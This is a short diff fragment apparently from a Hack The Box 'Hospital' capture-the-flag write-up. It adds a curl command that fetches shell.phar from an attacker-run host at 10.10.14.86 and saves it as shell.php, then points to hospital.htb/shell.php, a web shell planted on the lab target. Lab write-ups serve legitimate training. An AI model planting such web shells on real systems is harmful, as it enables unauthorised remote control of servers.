@@ -278,7 +278,9 @@ ghostscript.bat
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/6cd962b3-a083-4498-93a1-e99938668f6d)
 
+    curl 10.10.14.86:8000/shell.phar -o shell.php
 
+![image](https://github.com/zer00d4y/writeups/assets/128820441/2886ef3f-dcd3-421d-96b2-f76bbacad6f6)
 
 hospital.htb/shell.php
 
